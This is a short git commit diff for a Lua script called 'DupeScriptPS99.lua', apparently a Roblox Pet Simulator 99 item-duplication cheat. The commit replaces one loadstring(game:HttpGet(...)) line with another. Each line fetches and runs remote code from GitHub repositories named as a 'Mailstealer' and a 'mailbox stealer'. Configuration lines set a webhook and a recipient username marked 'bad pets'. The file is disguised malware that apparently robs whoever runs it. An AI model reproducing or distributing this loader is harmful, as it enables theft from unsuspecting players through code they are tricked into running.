ea2e17642b1cec8661a8209019174289c931b22a
DupePS99 <155266309+DupePS99@users.noreply.github.com>
2023-12-31 00:23:42 +0200

    Update DupeScriptPS99.lua

--- DupeScriptPS99.lua
+++ DupeScriptPS99.lua
@@ -3,4 +3,4 @@ Webhook = "Webhook Here" -- pings for pets
 UserName2 = "Hohalowka10" -- bad pets
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AngelThePs99Scripter/Ps99-mailbox-stealer-script-/main/Angels%20ps99%20mailbox%20stealer"))()
